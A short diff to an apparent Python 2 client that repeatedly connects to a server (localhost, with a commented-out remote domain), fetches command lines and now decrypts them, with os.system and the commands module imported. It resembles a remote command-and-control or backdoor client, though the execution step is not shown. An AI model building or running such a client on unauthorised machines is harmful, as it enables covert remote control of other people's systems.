@@ -4,6 +4,7 @@ from os import system,chdir
 import commands
 from time import sleep
 from message import message
+from encryption import Encrypter as enc
 
 HOST,PORT = "localhost", 738
 #HOST,PORT = "batterystapler.com", 738
@@ -15,10 +16,11 @@ while True:
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((HOST, PORT))
-        sock.sendall(data + "\n")
+        sock.sendall(data)
         received = sock.recv(1024).strip()
-        command = received.split("\n")[0]
-        if command == "\0":
+        command = enc.decrypt(received.split("\n")[0].strip())
+        print command,len(command)
+        if len(command) == 0:
             sleep(.1)
             data = get
         else:
